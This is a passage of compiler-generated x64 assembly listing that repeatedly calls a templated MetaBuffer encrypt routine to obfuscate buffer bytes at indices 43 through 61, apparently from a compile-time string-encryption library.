  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
